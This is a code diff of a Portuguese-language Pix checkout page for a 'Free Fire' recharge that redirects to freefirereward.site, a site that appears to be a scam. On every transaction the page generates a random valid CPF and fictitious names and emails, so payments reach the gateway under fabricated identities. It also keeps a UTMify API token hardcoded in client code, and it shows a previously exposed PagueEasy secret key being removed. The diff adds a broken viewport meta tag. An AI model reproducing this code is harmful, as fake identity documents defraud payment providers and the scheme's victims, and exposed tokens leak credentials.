@@ -30,20 +30,10 @@
         }, 300);
       })();
     </script>
-    <!-- Pixel do Facebook -->
     <script>
       // REMOVIDO: Facebook Pixel
     </script>
-    <!-- <noscript>
-      <img
-        height="1"
-        width="1"
-        style="display: none"
-        src="https://www.facebook.com/tr?id=687601267581599&ev=PageView&noscript=1"
-      />
-    </noscript> -->
-
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta name="viewport" content="width=device-width, initial="initial-scale=1.0" />
     <title>Finalizar Pagamento - Free Fire</title>
     <meta
       name="description"
@@ -289,7 +279,6 @@
       </div>
       <div id="pix-code" style="display: none"></div>
 
-      <!-- BOX DE AVISO -->
       <div
         id="pix-warning"
         style="
@@ -336,15 +325,17 @@
     </footer>
 
     <script>
-      // Configuração da API
-      const API_URL = "https://app.pagueeasy.com/api/v1/transaction.purchase";
-      const API_SECRET_KEY = "7bebc44b-a0ea-4938-8db0-3bd64e189f44";
+      // GARANTINDO QUE A URL DO BACKEND ESTEJA SEMPRE ACESSÍVEL
+      // Ajuste esta URL se o seu servidor estiver em uma porta ou domínio diferente.
+      window.BACKEND_URL = "http://localhost:3000";
+
+      // --- AS DEMAIS FUNÇÕES E LÓGICAS ABAIXO DESTA LINHA ---
 
       // Função para gerar CPF válido
       function gerarCPF() {
-        let cpf = '';
+        let cpf = "";
         while (true) {
-          cpf = '';
+          cpf = "";
           for (let i = 0; i < 9; i++) cpf += Math.floor(Math.random() * 10);
           let soma = 0;
           for (let i = 0; i < 9; i++) soma += parseInt(cpf[i]) * (10 - i);
@@ -363,90 +354,192 @@
 
       // Função para gerar nome e email fictício
       function gerarNomeEmail() {
-        const nomes = ["João", "Maria", "Pedro", "Ana", "Lucas", "Julia", "Miguel", "Sofia"];
-        const sobrenomes = ["Silva", "Santos", "Oliveira", "Souza", "Rodrigues", "Ferreira"];
+        const nomes = [
+          "João",
+          "Maria",
+          "Pedro",
+          "Ana",
+          "Lucas",
+          "Julia",
+          "Miguel",
+          "Sofia",
+        ];
+        const sobrenomes = [
+          "Silva",
+          "Santos",
+          "Oliveira",
+          "Souza",
+          "Rodrigues",
+          "Ferreira",
+        ];
         const nome = nomes[Math.floor(Math.random() * nomes.length)];
-        const sobrenome1 = sobrenomes[Math.floor(Math.random() * sobrenomes.length)];
-        const sobrenome2 = sobrenomes[Math.floor(Math.random() * sobrenomes.length)];
+        const sobrenome1 =
+          sobrenomes[Math.floor(Math.random() * sobrenomes.length)];
+        const sobrenome2 =
+          sobrenomes[Math.floor(Math.random() * sobrenomes.length)];
         const nomeCompleto = `${nome} ${sobrenome1} ${sobrenome2}`;
-        const email = `${nome.toLowerCase()}.${sobrenome1.toLowerCase()}${Math.floor(Math.random()*1000)}@email.com`;
+        const email = `${nome.toLowerCase()}.${sobrenome1.toLowerCase()}${Math.floor(
+          Math.random() * 1000
+        )}@email.com`;
         return { nomeCompleto, email };
       }
 
-// ====================
-// Função Utmify
-// ====================
-const UTMIFY_URL = "https://api.utmify.com.br/api-credentials/orders";
-const UTMIFY_TOKEN = "mH3Y79bB6pQKd3aJavkilhVTETVQyDebOhb7"; // Substitua pelo token real
+      // ====================
+      // Função Utmify
+      // ====================
+      const UTMIFY_URL = "https://api.utmify.com.br/api-credentials/orders";
+      const UTMIFY_TOKEN = "mH3Y79bB6pQKd3aJavkilhVTETVQyDebOhb7"; // Substitua pelo token real
 
-async function enviarParaUtmify(orderId, status, total, nome, email, telefone, cpf) {
-  const body = {
-    orderId: orderId.toString(),
-    platform: "FreeFireCheckout",
-    paymentMethod: "pix",
-    status: status,
-    createdAt: new Date().toISOString().slice(0, 19).replace('T', ' '),
-    approvedDate: status === "paid" ? new Date().toISOString().slice(0, 19).replace('T', ' ') : null,
-    refundedAt: null,
-    customer: {
-      name: nome,
-      email: email,
-      phone: telefone,
-      document: cpf,
-      country: "BR",
-      ip: (await fetch('https://api.ipify.org?format=json').then(res => res.json())).ip // <- PEGA IP REAL
-    },
-    products: [
-      {
-        id: "recarga-ff",
-        planId: "freefire-plan",     // <- ADICIONADO
-        planName: "Plano Recarga",   // <- ADICIONADO
-        name: "Recarga Free Fire",
-        quantity: 1,
-        priceInCents: Math.round(total * 100)
+      async function enviarParaUtmify(
+        orderId,
+        status,
+        total,
+        nome,
+        email,
+        telefone,
+        cpf
+      ) {
+        const body = {
+          orderId: orderId.toString(),
+          platform: "FreeFireCheckout",
+          paymentMethod: "pix",
+          status: status,
+          createdAt: new Date().toISOString().slice(0, 19).replace("T", " "),
+          approvedDate:
+            status === "paid"
+              ? new Date().toISOString().slice(0, 19).replace("T", " ")
+              : null,
+          refundedAt: null,
+          customer: {
+            name: nome,
+            email: email,
+            phone: telefone,
+            document: cpf,
+            ip: (
+              await fetch("https://api.ipify.org?format=json").then((res) =>
+                res.json()
+              )
+            ).ip, // <- PEGA IP REAL
+          },
+          products: [
+            {
+              id: "recarga-ff",
+              planId: "freefire-plan", // <- ADICIONADO
+              planName: "Plano Recarga", // <- ADICIONADO
+              name: "Recarga Free Fire",
+              quantity: 1,
+              priceInCents: Math.round(total * 100),
+            },
+          ],
+          trackingParameters: {
+            utm_source: new URLSearchParams(window.location.search).get(
+              "utm_source"
+            ),
+            utm_campaign: new URLSearchParams(window.location.search).get(
+              "utm_campaign"
+            ),
+            utm_medium: new URLSearchParams(window.location.search).get(
+              "utm_medium"
+            ),
+            utm_content: new URLSearchParams(window.location.search).get(
+              "utm_content"
+            ),
+            utm_term: new URLSearchParams(window.location.search).get(
+              "utm_term"
+            ),
+          },
+          commission: {
+            totalPriceInCents: Math.round(total * 100),
+            gatewayFeeInCents: 0,
+            userCommissionInCents: Math.round(total * 100),
+          },
+          isTest: false,
+        };
+
+        try {
+          const response = await fetch(UTMIFY_URL, {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json",
+              "x-api-token": UTMIFY_TOKEN,
+            },
+            body: JSON.stringify(body),
+          });
+          const result = await response.json();
+          console.log("UTMify resposta:", result);
+          if (!response.ok) {
+            alert("Erro ao enviar para UTMify: " + JSON.stringify(result));
+          }
+        } catch (e) {
+          console.error("Erro ao conectar na UTMify:", e);
+        }
       }
-    ],
-    trackingParameters: {
-      utm_source: new URLSearchParams(window.location.search).get("utm_source"),
-      utm_campaign: new URLSearchParams(window.location.search).get("utm_campaign"),
-      utm_medium: new URLSearchParams(window.location.search).get("utm_medium"),
-      utm_content: new URLSearchParams(window.location.search).get("utm_content"),
-      utm_term: new URLSearchParams(window.location.search).get("utm_term")
-    },
-    commission: {
-      totalPriceInCents: Math.round(total * 100),
-      gatewayFeeInCents: 0,
-      userCommissionInCents: Math.round(total * 100)
-    },
-    isTest: false
-  };
 
-  try {
-    const response = await fetch(UTMIFY_URL, {
-      method: "POST",
-      headers: {
-        "Content-Type": "application/json",
-        "x-api-token": UTMIFY_TOKEN
-      },
-      body: JSON.stringify(body)
-    });
-    const result = await response.json();
-    console.log("UTMify resposta:", result);
-    if (!response.ok) {
-      alert("Erro ao enviar para UTMify: " + JSON.stringify(result));
-    }
-  } catch (e) {
-    console.error("Erro ao conectar na UTMify:", e);
-  }
-}
+      // NOVO: Definindo monitorarPagamento antes de criarTransacaoPix
+      async function monitorarPagamento(
+        transactionId,
+        totalBase,
+        nome,
+        email,
+        telefone,
+        cpf
+      ) {
+        const API_STATUS_URL = `${window.BACKEND_URL}/payment-status?id=${transactionId}`;
+        const interval = setInterval(async () => {
+          try {
+            const response = await fetch(API_STATUS_URL);
+            const data = await response.json();
 
+            if (data.status === "approved") {
+              clearInterval(interval);
+              alert("Pagamento aprovado!");
 
-      // Função principal para criar transação PIX
+              // Envia para Utmify com status "paid"
+              enviarParaUtmify(
+                transactionId,
+                "paid",
+                totalBase,
+                nome,
+                email,
+                telefone,
+                cpf
+              );
+
+              // Redireciona após aprovado
+              setTimeout(() => {
+                window.location.href =
+                  "https://freefirereward.site/upsell.html" +
+                  window.location.search;
+              }, 1200);
+            } else if (
+              data.status === "canceled" ||
+              data.status === "refunded" ||
+              data.status === "expired"
+            ) {
+              clearInterval(interval);
+              alert(
+                `Pagamento ${data.status.toLowerCase()}. Por favor, refaça o pedido.`
+              );
+              console.log("Pagamento cancelado ou falho:", data.status);
+            }
+          } catch (e) {
+            console.error("Erro ao monitorar pagamento:", e);
+            // Silencia erros de polling para não sobrecarregar com alertas
+          }
+        }, 5000); // Polling a cada 5 segundos
+      }
+
+      // Função principal para criar transacao PIX
       async function criarTransacaoPix() {
         let email = localStorage.getItem("checkout_email");
-        let telefone = "87997653216";
-        let orderBumps = JSON.parse(localStorage.getItem("checkout_orderBumps") || "[]");
-        let totalBase = parseFloat(localStorage.getItem("checkout_total") || "19.97");
+        let telefone =
+          localStorage.getItem("checkout_telefone") || "87997653216"; // Usar o telefone do localStorage
+        let orderBumps = JSON.parse(
+          localStorage.getItem("checkout_orderBumps") || "[]"
+        );
+        let totalBase = parseFloat(
+          localStorage.getItem("checkout_total") || "19.97"
+        );
         let nome = localStorage.getItem("checkout_nome") || "Cliente Free Fire";
         if (!email) {
           const fake = gerarNomeEmail();
@@ -455,15 +548,18 @@ async function enviarParaUtmify(orderId, status, total, nome, email, telefone, c
         }
         if (!nome) nome = "Cliente Free Fire";
         if (!email) email = "cliente@freefire.com";
-        const cpf = "70819219061";
+        const cpf = gerarCPF(); // Gera um CPF válido a cada transação
+
         // Monta os itens (apenas para exibir na API, mas não somar novamente)
         let items = [
           {
-            unitPrice: Math.round((totalBase - orderBumps.reduce((sum, bump) => sum + bump.price, 0)) * 100),
+            unitPrice: Math.round(
+              (totalBase - orderBumps.reduce((sum, bump) => sum + bump.price, 0)) * 100
+            ),
             title: "Recarga Free Fire",
             quantity: 1,
-            tangible: false
-          }
+            tangible: false,
+          },
         ];
         if (orderBumps.length > 0) {
           orderBumps.forEach((bump) => {
@@ -471,112 +567,157 @@ async function enviarParaUtmify(orderId, status, total, nome, email, telefone, c
               unitPrice: Math.round(bump.price * 100),
               title: bump.name,
               quantity: 1,
-              tangible: false
-            });  
+              tangible: false,
+            });
           });
         }
-        // O amount deve ser exatamente igual ao total salvo
-        const amount = Math.round(totalBase * 100);
+
         // UTM e outros parâmetros opcionais
         const urlParams = new URLSearchParams(window.location.search);
         let utmParams = {};
-        ["utm_source", "utm_medium", "utm_campaign", "utm_content", "utm_term", "xcod", "sck"].forEach(key => {
+        [
+          "utm_source",
+          "utm_medium",
+          "utm_campaign",
+          "utm_content",
+          "utm_term",
+          "xcod",
+          "sck",
+        ].forEach((key) => {
           const val = urlParams.get(key);
           if (val) utmParams[key] = val;
         });
-        const utmQuery = Object.keys(utmParams).length ? new URLSearchParams(utmParams).toString() : undefined;
-        // Monta o payload
+
+        // Monta o payload para o seu backend
         const payload = {
-          name: nome,
+          nome: nome,
           email: email,
           cpf: cpf,
-          phone: telefone,
-          paymentMethod: "PIX",
-          amount: amount,
-          traceable: true,
+          telefone: telefone, // Mudado de 'phone' para 'telefone' para corresponder ao server.js
+          total: totalBase, // Mudado de 'amount' para 'total' para corresponder ao server.js
           items: items,
-          ...(utmQuery && { utmQuery })
+          tracking: {
+            utm: {
+              source: utmParams.utm_source || "",
+              medium: utmParams.utm_medium || "",
+              campaign: utmParams.utm_campaign || "",
+              content: utmParams.utm_content || "",
+              term: utmParams.utm_term || "",
+            },
+            xcod: utmParams.xcod || "",
+            sck: utmParams.sck || "",
+            cid: localStorage.getItem("utmify_cid") || "",
+          },
         };
-        console.log("Payload enviado:", JSON.stringify(payload, null, 2));
-        // Envia para a API
+
+        console.log("Payload enviado para o backend:", JSON.stringify(payload, null, 2));
+
+        // Envia para a API do seu backend
         try {
-          const response = await fetch(API_URL, {
+          const response = await fetch(`${window.BACKEND_URL}/create-payment`, {
             method: "POST",
             headers: {
               "Content-Type": "application/json",
-              "Authorization": API_SECRET_KEY
             },
-            body: JSON.stringify(payload)
+            body: JSON.stringify(payload),
           });
-          const data = await response.json();
-          if (response.ok && data.pixCode && data.id) { 
-            enviarParaUtmify(data.id, "waiting_payment", totalBase, nome, email, telefone, cpf);
 
+          const data = await response.json();
+
+          // Verifica se os dados estão corretos
+          if (response.ok && data.pix && data.pix.code && data.pix.qrcode_base64 && data.transactionId) {
+            // AQUI: Pegue o transactionId da resposta do backend
+            const transactionId = data.transactionId; 
             
-            // Gera QR Code com Google Charts usando o pixCode da PagueEasy
-            const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=${encodeURIComponent(data.pixCode)}`;
-            console.log("pixCode retornado:", data.pixCode);
-            console.log("URL do QR gerada:", qrUrl);
-            document.getElementById("pix-qrcode").src = qrUrl;
-            document.getElementById("pix-wrapper").style.display = "block";
-            document.getElementById("loading").style.display = "none";
-            document.getElementById("pix-code").textContent = data.pixCode;
-            document.getElementById("pix-code").style.display = "block";
-            document.getElementById("copiar-pix").style.display = "block";
-            document.getElementById("pix-warning").style.display = "block";
-            monitorarPagamento(data.id, totalBase, nome, email, telefone, cpf);
+            // Envia para UTMify com o status "waiting_payment"
+            enviarParaUtmify(
+              transactionId, // Usar transactionId corretamente
+              "waiting_payment",
+              totalBase,
+              nome,
+              email,
+              telefone,
+              cpf
+            );
+
+            const qrBase64 = data.pix.qrcode_base64;
+            const pixCopyCode = data.pix.code; // Corrigido para acessar data.pix.code
+
+            // Verifica se o QR Code base64 está correto
+            console.log("QR Code Base64:", qrBase64);
+            console.log("Código Pix:", pixCopyCode);
+
+            // Exibindo o QR Code base64 diretamente na página
+            const qrImageElement = document.getElementById("pix-qrcode");
+
+            if (qrImageElement) {
+              qrImageElement.src = `data:image/png;base64,${qrBase64}`;
+              document.getElementById("pix-wrapper").style.display = "block";
+              document.getElementById("loading").style.display = "none";
+
+              // Define o texto do código Pix e mostra
+              document.getElementById("pix-code").textContent = pixCopyCode;
+              document.getElementById("pix-code").style.display = "block";
+              document.getElementById("copiar-pix").style.display = "block";
+              document.getElementById("pix-warning").style.display = "block";
+
+              // Inicia o monitoramento do pagamento
+              monitorarPagamento(
+                transactionId, // Usar transactionId corretamente
+                totalBase,
+                nome,
+                email,
+                telefone,
+                cpf
+              );
+            } else {
+              console.error("Elemento para exibir o QR Code não encontrado.");
+            }
           } else {
+            // Se a resposta não foi OK ou faltaram dados essenciais
             document.getElementById("loading").style.display = "none";
-            alert("Erro ao gerar QR Code Pix: " + (data.message || JSON.stringify(data)));
+            const errorMessage = data.message || JSON.stringify(data);
+            alert("Erro ao gerar QR Code Pix: " + errorMessage);
+            console.error("Erro na resposta da BuckPay ou backend:", data);
           }
         } catch (e) {
           document.getElementById("loading").style.display = "none";
-          alert("Erro ao conectar com a API: " + e.message);
+          alert("Erro ao conectar com o backend: " + e.message);
+          console.error("Erro na comunicação com o backend:", e);
         }
       }
 
-// Função para monitorar status do pagamento
-function monitorarPagamento(id, totalBase, nome, email, telefone, cpf) {
-  const API_STATUS_URL = "https://app.pagueeasy.com/api/v1/transaction.getPayment?id=" + id;
-  const interval = setInterval(async () => {
-    try {
-      const response = await fetch(API_STATUS_URL, {
-        headers: { "Authorization": API_SECRET_KEY }
+      document.getElementById("copiar-pix").addEventListener("click", function () {
+        const pixCode = document.getElementById("pix-code").textContent;
+        navigator.clipboard
+          .writeText(pixCode)
+          .then(() => {
+            alert("Código Pix copiado!");
+          })
+          .catch((err) => {
+            console.error("Erro ao copiar Pix:", err);
+          });
       });
-      const data = await response.json();
-      if (data.status === "APPROVED") {
-        clearInterval(interval);
-        alert("Pagamento aprovado!");
-
-        // Envia para Utmify com status "paid"
-        enviarParaUtmify(id, "paid", totalBase, nome, email, telefone, cpf);
-
-        // Redireciona após aprovado
-        setTimeout(() => {
-          window.location.href = "https://freefirereward.site/upsell.html" + window.location.search;
-        }, 1200);
-      }
-    } catch (e) {
-      // Silencia erros de polling
-    }
-  }, 5000);
-}
-
 
       // Exemplo de uso ao carregar a página
-      document.addEventListener("DOMContentLoaded", function() {
+      document.addEventListener("DOMContentLoaded", function () {
         // Esconde a seção Pix até gerar
         if (document.getElementById("pix-wrapper")) {
           document.getElementById("pix-wrapper").style.display = "none";
         }
         // Exibe os order bumps escolhidos
-        const orderBumps = JSON.parse(localStorage.getItem("checkout_orderBumps") || "[]");
-        const orderBumpsContainer = document.getElementById("order-bumps-container");
+        const orderBumps = JSON.parse(
+          localStorage.getItem("checkout_orderBumps") || "[]"
+        );
+        const orderBumpsContainer =
+          document.getElementById("order-bumps-container");
         if (orderBumps && orderBumps.length > 0 && orderBumpsContainer) {
-          orderBumps.forEach(bump => {
+          orderBumps.forEach((bump) => {
             const div = document.createElement("div");
             div.className = "row bump-row";
-            div.innerHTML = `<span>${bump.name}</span><span>+ R$ ${bump.price.toFixed(2).replace('.', ',')}</span>`;
+            div.innerHTML = `<span>${
+              bump.name
+            }</span><span>+ R$ ${bump.price.toFixed(2).replace(".", ",")}</span>`;
             orderBumpsContainer.appendChild(div);
           });
         }
@@ -584,7 +725,7 @@ function monitorarPagamento(id, totalBase, nome, email, telefone, cpf) {
         const priceFinal = document.getElementById("price-final");
         const total = localStorage.getItem("checkout_total");
         if (priceFinal && total) {
-          priceFinal.textContent = `R$ ${parseFloat(total).toFixed(2).replace('.', ',')}`;
+          priceFinal.textContent = `R$ ${parseFloat(total).toFixed(2).replace(".", ",")}`;
         }
         // Gera Pix automaticamente ao carregar a página
         criarTransacaoPix();
